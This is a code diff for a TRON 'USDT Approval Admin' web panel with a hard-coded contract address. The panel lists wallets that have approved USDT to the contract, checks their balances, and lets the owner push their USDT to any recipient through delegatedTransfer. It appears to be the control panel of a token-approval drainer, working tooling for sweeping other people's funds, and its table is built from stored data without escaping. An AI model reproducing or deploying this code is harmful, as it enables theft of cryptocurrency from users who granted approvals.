@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>👑 एडमिन पैनल - Token Approval System</title>
+    <title>Admin - USDT Approvals</title>
     <style>
         * {
             margin: 0;
@@ -12,58 +12,91 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0b0e;
             color: #333;
+            min-height: 100vh;
+        }
+
+        .navbar {
+            background: white;
+            padding: 1rem 2rem;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
         .container {
-            max-width: 1200px;
-            margin: 0 auto;
+            max-width: 1400px;
+            margin: 80px auto 2rem;
+            padding: 0 2rem;
+        }
+
+        .contract-info {
             background: white;
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
         }
 
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .header h1 {
-            font-size: 36px;
+        .contract-info h3 {
+            margin-bottom: 10px;
             color: #333;
         }
 
-        .header h1 span {
+        .contract-address-box {
+            background: #f0f3ff;
+            padding: 15px;
+            border-radius: 12px;
+            font-family: monospace;
             color: #667eea;
-        }
-
-        .security-badge {
-            background: #dc3545;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 50px;
-            display: inline-block;
-            margin-bottom: 20px;
-            font-weight: bold;
+            font-weight: 600;
+            word-break: break-all;
         }
 
         .wallet-section {
-            background: #f8f9fa;
+            background: white;
+            border-radius: 16px;
             padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .wallet-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .owner-badge {
+            background: #f59e0b;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 50px;
+            font-size: 12px;
         }
 
         .btn {
-            padding: 12px 25px;
+            padding: 12px 24px;
             border: none;
             border-radius: 8px;
-            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
@@ -74,19 +107,160 @@
             color: white;
         }
 
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
-        }
-
-        .btn-danger {
-            background: #dc3545;
-            color: white;
-        }
-
         .btn-success {
-            background: #28a745;
+            background: #10b981;
             color: white;
+        }
+
+        .btn-info {
+            background: #3b82f6;
+            color: white;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .stat-card h3 {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .stat-card .number {
+            font-size: 28px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .filter-bar {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .filter-bar input,
+        .filter-bar select {
+            padding: 10px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            min-width: 250px;
+            flex: 1;
+        }
+
+        .table-container {
+            background: white;
+            border-radius: 16px;
+            overflow-x: auto;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th {
+            background: #f8f9fa;
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+            color: #666;
+            border-bottom: 2px solid #e0e0e0;
+        }
+
+        td {
+            padding: 15px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        tr:hover td {
+            background: #f8f9fa;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .status-active {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .status-used {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .action-btn {
+            padding: 6px 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 0 4px;
+        }
+
+        .transfer-btn {
+            background: #10b981;
+            color: white;
+        }
+
+        .balance-btn {
+            background: #3b82f6;
+            color: white;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #999;
         }
 
         .form-group {
@@ -100,247 +274,207 @@
             color: #333;
         }
 
-        .form-group input,
-        .form-group select {
+        .form-group input {
             width: 100%;
-            padding: 12px 15px;
+            padding: 12px;
             border: 2px solid #e0e0e0;
             border-radius: 8px;
-            font-size: 14px;
         }
 
-        .table-container {
-            overflow-x: auto;
-            margin-top: 20px;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-
-        th {
+        .user-info {
             background: #f8f9fa;
             padding: 15px;
-            text-align: left;
-            border-bottom: 2px solid #dee2e6;
-        }
-
-        td {
-            padding: 15px;
-            border-bottom: 1px solid #dee2e6;
-        }
-
-        .owner-only {
-            border: 2px solid #ffc107;
-            padding: 20px;
-            border-radius: 12px;
-            margin-top: 20px;
-        }
-
-        .warning {
-            background: #fff3cd;
-            color: #856404;
-            padding: 15px;
             border-radius: 8px;
-            margin: 20px 0;
+            margin-bottom: 20px;
         }
 
-        .status-badge {
-            display: inline-block;
-            padding: 5px 12px;
-            border-radius: 50px;
-            font-size: 12px;
-            font-weight: 600;
+        .user-info p {
+            margin: 5px 0;
+            color: #666;
         }
 
-        .status-badge.active {
-            background: #cce5ff;
-            color: #004085;
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 15px;
         }
 
-        .status-badge.used {
+        .error-message {
             background: #f8d7da;
             color: #721c24;
-        }
-
-        .filter-bar {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 25px;
-            flex-wrap: wrap;
-        }
-
-        .filter-bar input,
-        .filter-bar select {
-            padding: 10px 15px;
-            border: 2px solid #e0e0e0;
+            padding: 12px;
             border-radius: 8px;
-            min-width: 200px;
-            flex: 1;
+            margin-top: 15px;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .tx-link {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #666;
+            font-size: 12px;
         }
     </style>
 </head>
 <body>
+    <div class="navbar">
+        <div class="logo">USDT Approval Admin</div>
+        <div>
+            <span id="networkDisplay">🌐 Mainnet • USDT Only</span>
+        </div>
+    </div>
+
     <div class="container">
-        <!-- हेडर -->
-        <div class="header">
-            <h1>👑 <span>एडमिन पैनल</span></h1>
-            <p>सिर्फ कॉन्ट्रैक्ट ओनर के लिए</p>
-        </div>
-
-        <!-- सिक्योरिटी बैज -->
-        <div class="security-badge">
-            🔒 प्राइवेट एडमिन पैनल - ओनर वेरिफिकेशन जरूरी
-        </div>
-
-        <!-- कॉन्ट्रैक्ट एड्रेस सेटिंग -->
-        <div class="warning">
-            <strong>⚠️ कॉन्ट्रैक्ट एड्रेस:</strong>
-            <input type="text" id="contractAddress" value="TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt" 
-                   style="width: 100%; margin-top: 10px; padding: 8px;">
-            <button class="btn btn-success" style="margin-top: 10px;" onclick="updateContractAddress()">
-                ✅ एड्रेस सेट करें
-            </button>
-        </div>
-
-        <!-- वॉलेट कनेक्ट -->
-        <div class="wallet-section">
-            <button id="connectBtn" class="btn btn-primary" onclick="connectAdmin()">
-                🔌 एडमिन वॉलेट कनेक्ट करें
-            </button>
-            <div id="adminStatus" style="margin-top: 15px;"></div>
-        </div>
-
-        <!-- एडमिन पैनल (सिर्फ ओनर के लिए) -->
-        <div id="adminPanel" style="display: none;">
-            
-            <!-- स्टैट्स -->
-            <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px;">
-                <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; border-radius: 12px; color: white;">
-                    <h3>कुल ट्रांजेक्शन</h3>
-                    <div style="font-size: 28px; font-weight: bold;" id="totalTx">0</div>
-                </div>
-                <div style="background: #28a745; padding: 20px; border-radius: 12px; color: white;">
-                    <h3>कुल यूजर्स</h3>
-                    <div style="font-size: 28px; font-weight: bold;" id="totalUsers">0</div>
-                </div>
-                <div style="background: #ffc107; padding: 20px; border-radius: 12px; color: #333;">
-                    <h3>कुल वॉल्यूम</h3>
-                    <div style="font-size: 28px; font-weight: bold;" id="totalVolume">0</div>
-                </div>
-                <div style="background: #17a2b8; padding: 20px; border-radius: 12px; color: white;">
-                    <h3>एक्टिव अप्रूवल</h3>
-                    <div style="font-size: 28px; font-weight: bold;" id="activeApprovals">0</div>
-                </div>
+        <!-- Contract Info (Fixed) -->
+        <div class="contract-info">
+            <h3>📋 TokenOperator Contract</h3>
+            <div class="contract-address-box">
+                TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt
             </div>
+            <div style="margin-top: 10px; color: #666; font-size: 12px;">
+                USDT Address: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
+            </div>
+        </div>
 
-            <!-- ट्रांसफर सेक्शन (सिर्फ ओनर) -->
-            <div class="owner-only">
-                <h3 style="color: #856404; margin-bottom: 20px;">🚀 टोकन ट्रांसफर (ओनर ओनली)</h3>
-                
-                <div class="form-group">
-                    <label>टोकन:</label>
-                    <select id="transferToken">
-                        <option value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">USDT</option>
-                        <option value="TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8">USDC</option>
-                    </select>
+        <!-- Wallet Connection -->
+        <div class="wallet-section">
+            <div class="wallet-info">
+                <div>
+                    <strong>Wallet:</strong> 
+                    <span id="walletStatus">Not connected</span>
                 </div>
-
-                <div class="form-group">
-                    <label>फ्रॉम (जिसने अप्रूव किया):</label>
-                    <input type="text" id="fromAddress" placeholder="TXYZ...">
-                </div>
-
-                <div class="form-group">
-                    <label>टू:</label>
-                    <input type="text" id="toAddress" placeholder="TXYZ...">
-                </div>
-
-                <div class="form-group">
-                    <label>अमाउंट (USDT):</label>
-                    <input type="number" id="transferAmount" placeholder="100">
-                </div>
-
-                <button class="btn btn-success" onclick="executeTransfer()" id="transferBtn">
-                    🚀 ट्रांसफर करें
+                <button id="connectBtn" class="btn btn-primary" onclick="connectWallet()">
+                    Connect Owner Wallet
                 </button>
             </div>
+            <div id="walletDetails" style="margin-top: 15px;"></div>
+        </div>
 
-            <!-- अप्रूवल लिस्ट -->
-            <h3 style="margin: 30px 0 20px;">✅ हालिया अप्रूवल</h3>
-            
-            <div class="filter-bar">
-                <input type="text" id="approvalSearch" placeholder="🔍 यूजर सर्च...">
-                <select id="approvalFilter">
-                    <option value="all">सभी</option>
-                    <option value="active">एक्टिव</option>
-                    <option value="used">यूज्ड</option>
-                </select>
-                <button class="btn btn-primary" onclick="loadApprovals()">⟳ रिफ्रेश</button>
+        <!-- Stats -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h3>Total Approvals</h3>
+                <div class="number" id="totalApprovals">0</div>
             </div>
-
-            <div class="table-container">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>यूजर</th>
-                            <th>टोकन</th>
-                            <th>अमाउंट</th>
-                            <th>स्टेटस</th>
-                            <th>टाइम</th>
-                            <th>एक्शन</th>
-                        </tr>
-                    </thead>
-                    <tbody id="approvalsTable">
-                        <tr><td colspan="6" style="text-align: center;">⏳ डेटा लोड हो रहा है...</td></tr>
-                    </tbody>
-                </table>
+            <div class="stat-card">
+                <h3>Total Users</h3>
+                <div class="number" id="totalUsers">0</div>
             </div>
-
-            <!-- ट्रांजेक्शन हिस्ट्री -->
-            <h3 style="margin: 30px 0 20px;">📊 ट्रांजेक्शन हिस्ट्री</h3>
-            
-            <div class="table-container">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>टाइप</th>
-                            <th>फ्रॉम</th>
-                            <th>टू</th>
-                            <th>अमाउंट</th>
-                            <th>टाइम</th>
-                        </tr>
-                    </thead>
-                    <tbody id="transactionsTable">
-                        <tr><td colspan="5" style="text-align: center;">⏳ डेटा लोड हो रहा है...</td></tr>
-                    </tbody>
-                </table>
+            <div class="stat-card">
+                <h3>Total USDT Approved</h3>
+                <div class="number" id="totalVolume">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Active Approvals</h3>
+                <div class="number" id="activeApprovals">0</div>
             </div>
         </div>
 
-        <!-- अनऑथराइज्ड मैसेज -->
-        <div id="unauthorizedMsg" style="display: none; text-align: center; padding: 50px;">
-            <h2 style="color: #dc3545;">⛔ अनऑथराइज्ड एक्सेस</h2>
-            <p>यह पैनल सिर्फ कॉन्ट्रैक्ट ओनर के लिए है।</p>
+        <!-- Filters -->
+        <div class="filter-bar">
+            <input type="text" id="searchUser" placeholder="🔍 Search by user address..." onkeyup="filterApprovals()">
+            <select id="statusFilter" onchange="filterApprovals()">
+                <option value="all">All Approvals</option>
+                <option value="active">Active</option>
+                <option value="used">Used</option>
+            </select>
+            <button class="btn btn-primary" onclick="loadApprovals()">🔄 Refresh</button>
+        </div>
+
+        <!-- Approvals Table -->
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>User Address</th>
+                        <th>Token</th>
+                        <th>Approved USDT</th>
+                        <th>USDT Balance</th>
+                        <th>Status</th>
+                        <th>Time</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="approvalsTable">
+                    <tr>
+                        <td colspan="7" style="text-align: center; padding: 40px;">
+                            No USDT approvals yet. Users will appear here when they approve.
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="footer">
+            TokenOperator • USDT Only • Contract: TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt
+        </div>
+    </div>
+
+    <!-- Transfer Modal -->
+    <div id="transferModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Transfer USDT</h3>
+                <button class="close-btn" onclick="closeTransferModal()">&times;</button>
+            </div>
+
+            <div id="transferUserInfo" class="user-info">
+                <p><strong>User:</strong> <span id="modalUser"></span></p>
+                <p><strong>Approved USDT:</strong> <span id="modalApproved"></span> USDT</p>
+                <p><strong>USDT Balance:</strong> <span id="modalBalance"></span> USDT</p>
+            </div>
+
+            <div class="form-group">
+                <label>To Address</label>
+                <input type="text" id="modalToAddress" placeholder="Enter recipient address">
+            </div>
+
+            <div class="form-group">
+                <label>Amount (USDT)</label>
+                <input type="number" id="modalAmount" placeholder="Enter amount">
+            </div>
+
+            <button class="btn btn-success" onclick="executeTransfer()" id="transferBtn" style="width: 100%;">
+                Transfer USDT
+            </button>
+
+            <div id="transferResult"></div>
         </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
     <script>
         // ============================================
-        // एडमिन पैनल - सिर्फ ओनर के लिए
+        // CONFIGURATION - ONLY USDT
         // ============================================
-
-        let tronWeb = null;
-        let contract = null;
-        let adminAddress = null;
-        let contractOwner = null;
-        let contractAddress = "YOUR_CONTRACT_ADDRESS_HERE";
-
+        
+        const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
+        const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const NETWORK = "https://api.trongrid.io";
 
-        // कॉन्ट्रैक्ट ABI
+        // Contract ABI
         const CONTRACT_ABI = [
             {
                 "constant": false,
@@ -373,34 +507,92 @@
             }
         ];
 
-        // ============================================
-        // कॉन्ट्रैक्ट एड्रेस अपडेट करें
-        // ============================================
-        window.updateContractAddress = function() {
-            const newAddress = document.getElementById('contractAddress').value.trim();
-            if (newAddress && newAddress.startsWith('T')) {
-                contractAddress = newAddress;
-                alert('✅ कॉन्ट्रैक्ट एड्रेस सेट हो गया');
+        // State
+        let tronWeb = null;
+        let contract = null;
+        let adminAddress = null;
+        let contractOwner = null;
+        let approvals = [];
+        let currentUser = null;
+        let currentApprovedAmount = null;
+
+        // Load approvals from localStorage
+        function loadApprovals() {
+            const saved = localStorage.getItem('usdtApprovals');
+            if (saved) {
+                approvals = JSON.parse(saved);
             }
+            updateStats();
+            displayApprovals(approvals);
+        }
+
+        // Update stats
+        function updateStats() {
+            document.getElementById('totalApprovals').innerText = approvals.length;
+            
+            const uniqueUsers = new Set(approvals.map(a => a.user));
+            document.getElementById('totalUsers').innerText = uniqueUsers.size;
+            
+            const totalVolume = approvals.reduce((sum, a) => sum + parseFloat(a.amount || 0), 0);
+            document.getElementById('totalVolume').innerText = totalVolume.toLocaleString();
+            
+            const activeCount = approvals.filter(a => a.status === 'active').length;
+            document.getElementById('activeApprovals').innerText = activeCount;
+        }
+
+        // Display approvals
+        function displayApprovals(approvalsList) {
+            let html = '';
+            
+            for (let app of approvalsList) {
+                html += `
+                    <tr>
+                        <td>${shortenAddress(app.user)}</td>
+                        <td>USDT</td>
+                        <td>${app.amount} USDT</td>
+                        <td>
+                            <button class="action-btn balance-btn" onclick="checkBalance('${app.user}')">
+                                Check Balance
+                            </button>
+                        </td>
+                        <td><span class="status-badge status-${app.status}">${app.status}</span></td>
+                        <td>${new Date(app.time).toLocaleString()}</td>
+                        <td>
+                            <button class="action-btn transfer-btn" onclick="openTransferModal('${app.user}', '${app.amount}')">
+                                Transfer USDT
+                            </button>
+                        </td>
+                    </tr>
+                `;
+            }
+            
+            document.getElementById('approvalsTable').innerHTML = html || 
+                '<tr><td colspan="7" style="text-align: center; padding: 40px;">No USDT approvals found</td></tr>';
+        }
+
+        // Filter approvals
+        window.filterApprovals = function() {
+            const searchTerm = document.getElementById('searchUser').value.toLowerCase();
+            const statusFilter = document.getElementById('statusFilter').value;
+            
+            const filtered = approvals.filter(app => {
+                const matchesSearch = app.user.toLowerCase().includes(searchTerm);
+                const matchesStatus = statusFilter === 'all' || app.status === statusFilter;
+                return matchesSearch && matchesStatus;
+            });
+            
+            displayApprovals(filtered);
         };
 
-        // ============================================
-        // एडमिन कनेक्ट करें
-        // ============================================
-        window.connectAdmin = async function() {
-            if (contractAddress === "YOUR_CONTRACT_ADDRESS_HERE") {
-                alert('पहले कॉन्ट्रैक्ट एड्रेस डालें!');
-                return;
-            }
-
+        // Connect wallet
+        window.connectWallet = async function() {
             const connectBtn = document.getElementById('connectBtn');
             connectBtn.disabled = true;
-            connectBtn.innerHTML = '⏳ वेरिफाई हो रहा है...';
+            connectBtn.innerHTML = '<span class="loading"></span> Connecting...';
 
             try {
                 if (!window.tronLink) {
-                    alert('TronLink वॉलेट इंस्टॉल नहीं है!');
-                    return;
+                    throw new Error('TronLink not installed');
                 }
 
                 await window.tronLink.request({ method: 'tron_requestAccounts' });
@@ -412,55 +604,156 @@
 
                 adminAddress = tronWeb.defaultAddress.base58;
                 
-                // कॉन्ट्रैक्ट इनिशियलाइज करें
-                contract = await tronWeb.contract(CONTRACT_ABI, contractAddress);
+                // Initialize contract
+                contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                 contractOwner = await contract.owner().call();
 
-                // चेक करें कि एडमिन ओनर है या नहीं
+                // Update UI
+                document.getElementById('walletStatus').innerHTML = '✅ Connected';
+                
+                let walletHtml = `<div><strong>Address:</strong> ${shortenAddress(adminAddress)}`;
                 if (adminAddress.toLowerCase() === contractOwner.toLowerCase()) {
-                    // ओनर है - एडमिन पैनल दिखाएं
-                    document.getElementById('adminPanel').style.display = 'block';
-                    document.getElementById('unauthorizedMsg').style.display = 'none';
-                    document.getElementById('adminStatus').innerHTML = `
-                        <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 8px;">
-                            ✅ ओनर वेरिफाइड! एडमिन पैनल एक्सेस ग्रांटेड
-                        </div>
-                    `;
-                    
-                    // डेमो डेटा लोड करें
-                    loadDemoData();
-                    
+                    walletHtml += ` <span class="owner-badge">✓ Owner Verified</span>`;
                 } else {
-                    // ओनर नहीं है - एक्सेस डिनाइड
-                    document.getElementById('adminPanel').style.display = 'none';
-                    document.getElementById('unauthorizedMsg').style.display = 'block';
-                    document.getElementById('adminStatus').innerHTML = `
-                        <div style="background: #f8d7da; color: #721c24; padding: 15px; border-radius: 8px;">
-                            ⛔ आप कॉन्ट्रैक्ट ओनर नहीं हैं! एक्सेस डिनाइड
-                        </div>
-                    `;
+                    walletHtml += ` <span style="color: #ef4444;">(Not owner - transfers disabled)</span>`;
+                }
+                walletHtml += `</div>`;
+                document.getElementById('walletDetails').innerHTML = walletHtml;
+
+                if (adminAddress.toLowerCase() === contractOwner.toLowerCase()) {
+                    loadApprovals();
                 }
 
             } catch (error) {
-                console.error(error);
-                alert('एरर: ' + error.message);
+                alert('Error: ' + error.message);
             } finally {
                 connectBtn.disabled = false;
-                connectBtn.innerHTML = '🔌 एडमिन वॉलेट कनेक्ट करें';
+                connectBtn.innerHTML = 'Connect Owner Wallet';
             }
         };
 
-        // ============================================
-        // डेमो डेटा लोड करें
-        // ============================================
-        function loadDemoData() {
-            // स्टैट्स अपडेट करें
-            document.getElementById('totalTx').innerText = '156';
-            document.getElementById('totalUsers').innerText = '45';
-            document.getElementById('totalVolume').innerText = '125,000';
-            document.getElementById('activeApprovals').innerText = '23';
+        // Check user balance
+        window.checkBalance = async function(userAddress) {
+            if (!contract) {
+                alert('Please connect wallet first');
+                return;
+            }
 
-            // अप्रूवल टेबल
-            const approvals = [
-                { user: 'TXYZ1234...', token: 'USDT', amount: '5,000', status: 'active', time: '2024-01-15 10:30' },
-               
+            try {
+                const balance = await contract.balanceOfToken(USDT_ADDRESS, userAddress).call();
+                const humanReadable = (balance / 1000000).toFixed(2);
+                alert(`💰 USDT Balance: ${humanReadable} USDT`);
+            } catch (error) {
+                alert('Error checking balance: ' + error.message);
+            }
+        };
+
+        // Open transfer modal
+        window.openTransferModal = function(userAddress, approvedAmount) {
+            if (!contract || adminAddress.toLowerCase() !== contractOwner.toLowerCase()) {
+                alert('Only contract owner can transfer');
+                return;
+            }
+
+            currentUser = userAddress;
+            currentApprovedAmount = approvedAmount;
+            
+            document.getElementById('modalUser').innerText = shortenAddress(userAddress);
+            document.getElementById('modalApproved').innerText = approvedAmount;
+            
+            // Get current balance
+            contract.balanceOfToken(USDT_ADDRESS, userAddress).call().then(balance => {
+                document.getElementById('modalBalance').innerText = (balance / 1000000).toFixed(2);
+            }).catch(() => {
+                document.getElementById('modalBalance').innerText = '?';
+            });
+            
+            document.getElementById('transferModal').style.display = 'flex';
+        };
+
+        // Close transfer modal
+        window.closeTransferModal = function() {
+            document.getElementById('transferModal').style.display = 'none';
+            document.getElementById('modalToAddress').value = '';
+            document.getElementById('modalAmount').value = '';
+            document.getElementById('transferResult').innerHTML = '';
+        };
+
+        // Execute transfer
+        window.executeTransfer = async function() {
+            const toAddress = document.getElementById('modalToAddress').value;
+            const amount = document.getElementById('modalAmount').value;
+
+            if (!toAddress || !amount) {
+                showTransferResult('Please fill all fields', 'error');
+                return;
+            }
+
+            if (parseFloat(amount) > parseFloat(currentApprovedAmount)) {
+                showTransferResult('Amount exceeds approved amount', 'error');
+                return;
+            }
+
+            const transferBtn = document.getElementById('transferBtn');
+            transferBtn.disabled = true;
+            transferBtn.innerHTML = '<span class="loading"></span> Transferring...';
+
+            try {
+                const amountInSun = Math.floor(amount * 1000000);
+                
+                const result = await contract.delegatedTransfer(
+                    USDT_ADDRESS,
+                    currentUser,
+                    toAddress,
+                    amountInSun
+                ).send();
+
+                showTransferResult(`✅ Transfer successful! TX: ${shortenAddress(result)}`, 'success');
+
+                // Update approval status
+                approvals = approvals.map(a => {
+                    if (a.user === currentUser && a.status === 'active') {
+                        return {...a, status: 'used'};
+                    }
+                    return a;
+                });
+                localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
+                
+                setTimeout(() => {
+                    closeTransferModal();
+                    loadApprovals();
+                }, 2000);
+
+            } catch (error) {
+                showTransferResult('❌ Error: ' + error.message, 'error');
+            } finally {
+                transferBtn.disabled = false;
+                transferBtn.innerHTML = 'Transfer USDT';
+            }
+        };
+
+        function showTransferResult(message, type) {
+            const resultDiv = document.getElementById('transferResult');
+            resultDiv.innerHTML = `<div class="${type}-message">${message}</div>`;
+        }
+
+        function shortenAddress(addr) {
+            if (!addr || addr.length < 10) return addr;
+            return addr.slice(0, 6) + '...' + addr.slice(-4);
+        }
+
+        // Initialize
+        window.onload = function() {
+            loadApprovals();
+        };
+
+        // Close modal on outside click
+        window.onclick = function(event) {
+            const modal = document.getElementById('transferModal');
+            if (event.target == modal) {
+                modal.style.display = 'none';
+            }
+        };
+    </script>
+</body>
+</html>
